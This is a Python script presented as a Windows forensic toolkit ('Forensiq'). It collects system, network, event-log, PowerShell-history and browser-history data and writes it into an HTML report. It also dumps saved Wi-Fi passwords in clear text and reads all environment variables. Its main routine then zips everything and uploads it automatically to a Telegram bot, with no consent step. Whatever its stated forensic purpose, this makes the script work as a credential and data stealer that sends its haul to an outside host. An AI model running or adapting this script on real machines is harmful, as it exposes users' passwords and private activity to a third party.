import os
import platform
import getpass
import socket
import shutil
import subprocess
import datetime
import json
import psutil
import sqlite3
import glob
import tempfile
from pathlib import Path
from zipfile import ZipFile
import webbrowser
import requests

# === CONFIG ===
OUTPUT_DIR = Path("Forensiq_output")
OUTPUT_DIR.mkdir(exist_ok=True)

TELEGRAM_BOT_TOKEN = 'Your_Token'  # <-- Replace this
TELEGRAM_CHAT_ID = 'Your Chad ID'      # <-- Replace this

# ===Banner ===
from colorama import Fore, Style, init
init(autoreset=True)

def show_banner():
    banner = f"""{Fore.BLUE}
     ______                           _      
    / ____/___  ________  ____  _____(_)___ _
   / /_  / __ \\/ ___/ _ \\/ __ \\/ ___/ / __ `/
  / __/ / /_/ / /  /  __/ / / (__  ) / /_/ / 
 /_/    \\____/_/   \\___/_/ /_/____/_/\\__, /  
                                     /_/     

            {Fore.MAGENTA}>> FORENSIQ - Advanced Forensic Intelligence Toolkit <<
                     Developed by Tarun Sharma
"""
    print(banner)

show_banner()

# === UTILITIES ===
def write_data(title, data):
    try:
        with open(OUTPUT_DIR / f"{title}.txt", "w", encoding="utf-8") as f:
            f.write(data)
    except Exception as e:
        print(f"[!] Failed to write {title}: {e}")

def run_cmd(cmd):
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL)
        return result.decode('utf-8', errors='ignore')
    except Exception as e:
        return f"Error running command `{cmd}`: {e}"

# === PART 1: SYSTEM & USER INFO ===
def get_system_info():
    info = {
        "Username": getpass.getuser(),
        "Hostname": socket.gethostname(),
        "OS": platform.platform(),
        "Architecture": platform.machine(),
        "Processor": platform.processor(),
        "CPU Cores": psutil.cpu_count(logical=False),
        "Logical CPUs": psutil.cpu_count(),
        "RAM": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
        "System Boot Time": datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
    }
    write_data("01_System_Info", json.dumps(info, indent=4))
    return info

def get_env_vars():
    env_data = "\n".join([f"{k}={v}" for k, v in os.environ.items()])
    write_data("02_Environment_Variables", env_data)

def get_installed_programs():
    programs = run_cmd('wmic product get name,version')
    write_data("03_Installed_Programs", programs)

def get_user_accounts():
    users = run_cmd('net user')
    write_data("04_User_Accounts", users)

def get_admin_accounts():
    admins = run_cmd('net localgroup administrators')
    write_data("05_Admin_Accounts", admins)

def get_local_groups():
    groups = run_cmd('net localgroup')
    write_data("06_Local_Groups", groups)

def get_logon_sessions():
    sessions = run_cmd('query user')
    write_data("07_Logon_Sessions", sessions)

def get_user_profiles():
    profiles = run_cmd('wmic useraccount get name,sid')
    write_data("08_User_Profiles", profiles)

def get_hotfixes():
    hotfixes = run_cmd('wmic qfe list')
    write_data("09_Hotfixes", hotfixes)

def get_os_info():
    sysinfo = run_cmd('systeminfo')
    write_data("10_OS_Details", sysinfo)

def part1_run():
    print("[+] Gathering system & user info...")
    get_system_info()
    get_env_vars()
    get_installed_programs()
    get_user_accounts()
    get_admin_accounts()
    get_local_groups()
    get_logon_sessions()
    get_user_profiles()
    get_hotfixes()
    get_os_info()

# === PART 2: SECURITY & NETWORK ===

def get_defender_status():
    status = run_cmd('powershell -Command "Get-MpComputerStatus | Format-List"')
    write_data("11_Windows_Defender_Status", status)

def get_firewall_rules():
    rules = run_cmd('netsh advfirewall firewall show rule name=all')
    write_data("12_Firewall_Rules", rules)

def get_adapter_info():
    info = run_cmd("ipconfig /all")
    write_data("13_Network_Adapters", info)

def get_ip_config():
    ipv4 = run_cmd("ipconfig")
    write_data("14_IP_Config", ipv4)

def get_arp_cache():
    arp = run_cmd("arp -a")
    write_data("15_ARP_Cache", arp)

def get_tcp_connections():
    netstat = run_cmd("netstat -ano")
    write_data("16_TCP_Connections", netstat)

def get_dns_cache():
    dns = run_cmd("ipconfig /displaydns")
    write_data("17_DNS_Cache", dns)

def get_wifi_profiles():
    profiles = run_cmd("netsh wlan show profiles")
    write_data("18_WiFi_Profiles", profiles)

def get_wifi_passwords():
    result = ""
    profiles_output = run_cmd("netsh wlan show profiles")
    profiles = [line.split(":")[1].strip() for line in profiles_output.splitlines() if "All User Profile" in line]
    for profile in profiles:
        pw = run_cmd(f'netsh wlan show profile name="{profile}" key=clear')
        result += f"\n\n=== {profile} ===\n" + pw
    write_data("19_WiFi_Passwords", result)

def get_smb_info():
    shares = run_cmd("net share")
    sessions = run_cmd("net session")
    write_data("20_SMB_Shares", shares)
    write_data("21_SMB_Sessions", sessions)

def get_ip_routes():
    routes = run_cmd("route print")
    write_data("22_IP_Routes", routes)

def get_ipv6_routes():
    ipv6 = run_cmd("netsh interface ipv6 show route")
    filtered = "\n".join([line for line in ipv6.splitlines() if "Infinite" in line])
    write_data("23_IPv6_Infinite_Routes", filtered)

def get_rdp_connections():
    outgoing = run_cmd('reg query "HKCU\\Software\\Microsoft\\Terminal Server Client\\Default"')
    write_data("24_RDP_Outgoing", outgoing)

def get_scheduled_tasks():
    tasks = run_cmd("schtasks /query /fo LIST /v")
    write_data("25_Scheduled_Tasks", tasks)

def get_services():
    services = run_cmd("powershell Get-Service | Format-Table -AutoSize")
    write_data("26_Services", services)

def part2_run():
    print("[+] Gathering security, network & firewall info...")
    get_defender_status()
    get_firewall_rules()
    get_adapter_info()
    get_ip_config()
    get_arp_cache()
    get_tcp_connections()
    get_dns_cache()
    get_wifi_profiles()
    get_wifi_passwords()
    get_smb_info()
    get_ip_routes()
    get_ipv6_routes()
    get_rdp_connections()
    get_scheduled_tasks()
    get_services()

# === PART 3: USB, DEVICES, FILES ===

def get_logical_drives():
    drives = run_cmd("wmic logicaldisk get name,description,filesystem,freespace,size")
    write_data("27_Logical_Drives", drives)

def get_webcams():
    cams = run_cmd("powershell Get-CimInstance Win32_PnPEntity | Where-Object {$_.Name -like '*Camera*'}")
    write_data("28_Webcams", cams)

def get_usb_devices():
    usb = run_cmd("powershell Get-PnpDevice -Class 'USB'")
    write_data("29_USB_Devices", usb)

def get_upnp_devices():
    upnp = run_cmd("powershell Get-Service SSDPDiscovery")
    write_data("30_UPNP_Devices", upnp)

def get_previous_drives():
    previous = run_cmd("reg query HKLM\\SYSTEM\\MountedDevices")
    write_data("31_Previous_Mounted_Drives", previous)

def get_recent_files(days=180):
    base_dirs = [os.environ['USERPROFILE'], "C:\\Users\\Public"]
    result = ""
    cutoff = datetime.datetime.now() - datetime.timedelta(days=days)
    for base in base_dirs:
        for root, _, files in os.walk(base):
            for name in files:
                try:
                    filepath = os.path.join(root, name)
                    ctime = datetime.datetime.fromtimestamp(os.path.getctime(filepath))
                    if ctime > cutoff:
                        result += f"{ctime} - {filepath}\n"
                except:
                    continue
    write_data("32_Recent_Created_Files", result)

def get_powershell_history():
    result = ""
    user = os.environ['USERPROFILE']
    for path in glob.glob(f"{user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt"):
        try:
            with open(path, errors='ignore') as f:
                result += f.read()
        except:
            continue
    write_data("33_PowerShell_History", result)

def find_executables():
    result = ""
    folders = [
        os.environ['USERPROFILE'] + "\\Downloads",
        os.environ['USERPROFILE'] + "\\AppData\\Local\\Temp",
        os.environ['USERPROFILE'] + "\\Documents",
        "C:\\PerfLogs"
    ]
    for folder in folders:
        for root, _, files in os.walk(folder):
            for name in files:
                if name.lower().endswith('.exe'):
                    path = os.path.join(root, name)
                    result += path + "\n"
    write_data("34_Suspicious_Executables", result)

def ransomware_check():
    known_exts = ['.locked', '.cryp1', '.crypt', '.enc', '.enc1', '.kkk', '.zzz', '.rnsm']
    matches = []
    for root, _, files in os.walk("C:\\"):
        for f in files:
            for ext in known_exts:
                if f.lower().endswith(ext):
                    matches.append(os.path.join(root, f))
    write_data("35_Ransomware_Extensions", "\n".join(matches))

def check_registry_persistence():
    reg_paths = [
        r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run',
        r'HKLM\Software\Microsoft\Windows\CurrentVersion\Run',
        r'HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
    ]
    output = ""
    for path in reg_paths:
        output += f"\n--- {path} ---\n"
        output += run_cmd(f'reg query "{path}"') + "\n"
    write_data("36_Registry_Persistence", output)

def part3_run():
    print("[+] Gathering drive, USB, PowerShell, and persistence info...")
    get_logical_drives()
    get_webcams()
    get_usb_devices()
    get_upnp_devices()
    get_previous_drives()
    get_recent_files()
    get_powershell_history()
    find_executables()
    ransomware_check()
    check_registry_persistence()

# === PART 4: USER ACTIVITIES, LOGINS, CREDENTIALS ===

def get_group_memberships():
    memberships = run_cmd("net localgroup")
    write_data("37_Group_Memberships", memberships)

def get_logon_events():
    events = run_cmd('wevtutil qe Security "/q:*[System[(EventID=4624)]]" /f:text /c:50')
    write_data("38_Logon_Events", events)

def get_account_lockouts():
    lockouts = run_cmd('wevtutil qe Security "/q:*[System[(EventID=4740)]]" /f:text /c:50')
    write_data("39_Account_Lockouts", lockouts)

def get_created_users():
    created = run_cmd('wevtutil qe Security "/q:*[System[(EventID=4720)]]" /f:text /c:50')
    write_data("40_Created_Users", created)

def get_password_resets():
    resets = run_cmd('wevtutil qe Security "/q:*[System[(EventID=4724)]]" /f:text /c:50')
    write_data("41_Password_Resets", resets)

def get_user_status_changes():
    enabled = run_cmd('wevtutil qe Security "/q:*[System[(EventID=4722)]]" /f:text /c:30')
    disabled = run_cmd('wevtutil qe Security "/q:*[System[(EventID=4725)]]" /f:text /c:30')
    deleted = run_cmd('wevtutil qe Security "/q:*[System[(EventID=4726)]]" /f:text /c:30')
    write_data("42_Enabled_Users", enabled)
    write_data("43_Disabled_Users", disabled)
    write_data("44_Deleted_Users", deleted)

def get_cred_manager_events():
    events = run_cmd("wevtutil qe Microsoft-Windows-CredentialManager/Operational /f:text /c:100")
    write_data("45_Credential_Manager_Events", events)

def get_object_access():
    events = run_cmd('wevtutil qe Security "/q:*[System[(EventID=4663)]]" /f:text /c:50')
    write_data("46_Object_Access", events)

def get_suspicious_processes():
    events = run_cmd('wevtutil qe Security "/q:*[System[(EventID=4688)]]" /f:text /c:50')
    write_data("47_Suspicious_Process_Executions", events)

# === BROWSER HISTORY EXTRACTION ===
def extract_sqlite_history(db_path, query, output_file):
    if not db_path.exists():
        write_data(output_file, f"No database found at {db_path}")
        return
    try:
        # Copy DB to temp to avoid lock errors
        with tempfile.NamedTemporaryFile(delete=False) as tmpfile:
            shutil.copy2(db_path, tmpfile.name)
            conn = sqlite3.connect(tmpfile.name)
            cursor = conn.cursor()
            cursor.execute(query)
            results = cursor.fetchall()
            conn.close()
        os.unlink(tmpfile.name)

        output = "\n".join([f"{r[2]} | {r[0]} | {r[1]}" for r in results])
        write_data(output_file, output)
    except Exception as e:
        write_data(output_file, f"Error reading database: {e}")

def extract_chrome_history():
    path = Path(os.environ['USERPROFILE']) / "AppData/Local/Google/Chrome/User Data/Default/History"
    query = "SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch') FROM urls ORDER BY last_visit_time DESC LIMIT 50;"
    extract_sqlite_history(path, query, "48_Chrome_Browser_History")

def extract_firefox_history():
    firefox_profiles = Path(os.environ['APPDATA']) / "Mozilla/Firefox/Profiles"
    history_files = list(firefox_profiles.rglob("places.sqlite"))
    if not history_files:
        write_data("49_Firefox_Browser_History", "No Firefox history found")
        return
    query = "SELECT url, title, datetime(last_visit_date/1000000,'unixepoch') FROM moz_places ORDER BY last_visit_date DESC LIMIT 50;"
    extract_sqlite_history(history_files[0], query, "49_Firefox_Browser_History")

def extract_edge_history():
    edge_path = Path(os.environ['USERPROFILE']) / "AppData/Local/Microsoft/Edge/User Data/Default/History"
    query = "SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch') FROM urls ORDER BY last_visit_time DESC LIMIT 50;"
    extract_sqlite_history(edge_path, query, "50_Edge_Browser_History")

def part4_run():
    print("[+] Gathering user events, credential, logon, browser history...")
    get_group_memberships()
    get_logon_events()
    get_account_lockouts()
    get_created_users()
    get_password_resets()
    get_user_status_changes()
    get_cred_manager_events()
    get_object_access()
    get_suspicious_processes()
    extract_chrome_history()
    extract_firefox_history()
    extract_edge_history()

# === REPORT GENERATION ===
def generate_html_report():
    html = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>🛡️ Forensiq Report</title>
<style>
body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background-color: #0a1e3f;
    color: #cbd5e1;
    margin: 0;
    padding: 0;
}
.container {
    max-width: 1100px;
    margin: 20px auto;
    background: #142a5c;
    border-radius: 12px;
    padding: 25px;
    box-shadow: 0 0 15px rgba(0,0,0,0.7);
}
h1 {
    text-align: center;
    color: #60a5fa;
    font-weight: 700;
    font-size: 36px;
    margin-bottom: 15px;
    text-shadow: 0 0 10px #3b82f6;
}
.branding {
    text-align: center;
    font-size: 14px;
    color: #94a3b8;
    margin-bottom: 30px;
}
#toc {
    background: #1e3a7a;
    border-radius: 10px;
    padding: 20px;
    margin-bottom: 30px;
}
#toc h2 {
    color: #f0f9ff;
    margin-top: 0;
    font-weight: 600;
}
#toc ul {
    list-style: none;
    padding: 0;
    margin: 0;
    column-count: 2;
}
#toc li {
    margin: 8px 0;
}
#toc a {
    color: #7dd3fc;
    text-decoration: none;
}
#toc a:hover {
    text-decoration: underline;
}
.section {
    background: #1a2e5d;
    border-radius: 10px;
    margin-bottom: 25px;
    padding: 15px 20px;
    border: 1px solid #3b82f6;
}
.section h2 {
    margin: 0;
    cursor: pointer;
    font-size: 20px;
    color: #a5b8ff;
    user-select: none;
}
.section-content {
    display: none;
    white-space: pre-wrap;
    margin-top: 10px;
    font-size: 14px;
    max-height: 400px;
    overflow-y: auto;
    background: #0f2a66;
    border-radius: 6px;
    padding: 10px;
    border: 1px solid #294eab;
}
.button-container {
    text-align: center;
    margin-bottom: 30px;
}
button {
    background-color: #2563eb;
    border: none;
    color: white;
    padding: 10px 20px;
    margin: 0 10px;
    border-radius: 8px;
    cursor: pointer;
    font-weight: 600;
    box-shadow: 0 0 8px #2563ebaa;
}
button:hover {
    background-color: #1e40af;
}
</style>
</head>
<body>
<div class="container">
<h1>🛡️ Forensiq Forensic Report</h1>
<div class="branding">Created by Tarun Sharma</div>

<div class="button-container">
<button onclick="expandAll()">Expand All</button>
<button onclick="collapseAll()">Collapse All</button>
</div>

<div id="toc">
<h2>Contents</h2>
<ul>

"""

    # Generate Table of Contents and Sections
    txt_files = sorted(OUTPUT_DIR.glob("*.txt"))
    for i, file in enumerate(txt_files, start=1):
        title = file.stem.replace("_", " ")
        html += f'<li><a href="#section{i}">{title}</a></li>\n'
    html += "</ul></div>"

    # Add each section
    for i, file in enumerate(txt_files, start=1):
        try:
            content = file.read_text(encoding="utf-8")
            # Escape HTML special chars for display
            content = content.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        except Exception as e:
            content = f"Error reading file: {e}"

        html += f"""
<div class="section">
<h2 id="section{i}" onclick="toggleSection(this)">{file.stem.replace("_", " ")}</h2>
<div class="section-content">{content}</div>
</div>
"""

    html += """
</div>

<script>
function toggleSection(header) {
    const content = header.nextElementSibling;
    if(content.style.display === "block") {
        content.style.display = "none";
    } else {
        content.style.display = "block";
    }
}

function expandAll() {
    document.querySelectorAll('.section-content').forEach(div => div.style.display = "block");
}

function collapseAll() {
    document.querySelectorAll('.section-content').forEach(div => div.style.display = "none");
}
</script>

</body>
<!-- GitHub Footer Start -->
<footer style="text-align: center; padding: 20px; font-size: 14px; color: #ddd; background-color: #0a1a2f;">
  🔗 View Source on 
  <a href="https://github.com/DeadpooHackes/Forensiq" target="_blank" style="color: #4da6ff; text-decoration: none;">
    GitHub
  </a>
  <br>
  <span style="font-size: 12px; color: #aaa;">© 2025 Forensiq by Tarun Sharma</span>
</footer>
<!-- GitHub Footer End -->
</html>
"""

    # Write to HTML file
    report_path = OUTPUT_DIR / "Forensiq_report.html"
    with open(report_path, "w", encoding="utf-8") as f:
        f.write(html)
    print(f"[+] HTML report generated at {report_path}")
    return report_path

# === ZIP ALL REPORT FILES ===
def create_zip_archive():
    zip_path = OUTPUT_DIR / "Forensiq_report.zip"
    with ZipFile(zip_path, "w") as zipf:
        for file in OUTPUT_DIR.glob("*.*"):
            if file.suffix in [".txt", ".html"]:
                zipf.write(file, arcname=file.name)
    print(f"[+] ZIP archive created at {zip_path}")
    return zip_path

# === SEND REPORT VIA TELEGRAM ===
def send_to_telegram():
    report_html = OUTPUT_DIR / "Forensiq_report.html"
    report_zip = OUTPUT_DIR / "Forensiq_report.zip"
    if not report_html.exists() or not report_zip.exists():
        print("[!] Report files missing. Generate report and ZIP before sending.")
        return

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    files = {
        'document': open(report_zip, 'rb')
    }
    data = {
        'chat_id': TELEGRAM_CHAT_ID,
        'caption': '🛡️ Forensiq Forensic Report (ZIP Archive)'
    }
    print("[+] Sending ZIP archive to Telegram...")
    resp = requests.post(url, files=files, data=data)
    if resp.status_code == 200:
        print("[+] ZIP sent successfully.")
    else:
        print(f"[!] Failed to send ZIP: {resp.text}")

    # Also send HTML as a separate document
    with open(report_html, 'rb') as f:
        files2 = {'document': f}
        data2 = {'chat_id': TELEGRAM_CHAT_ID, 'caption': '🛡️ Forensiq HTML Report'}
        print("[+] Sending HTML report to Telegram...")
        resp2 = requests.post(url, files=files2, data=data2)
        if resp2.status_code == 200:
            print("[+] HTML sent successfully.")
        else:
            print(f"[!] Failed to send HTML: {resp2.text}")

# === MAIN RUN FUNCTION ===
def run_all():
    part1_run()
    part2_run()
    part3_run()
    part4_run()
    report_path = generate_html_report()
    create_zip_archive()
    send_to_telegram()
    # Optionally open the report locally
    webbrowser.open(report_path.as_uri())

if __name__ == "__main__":
    run_all()
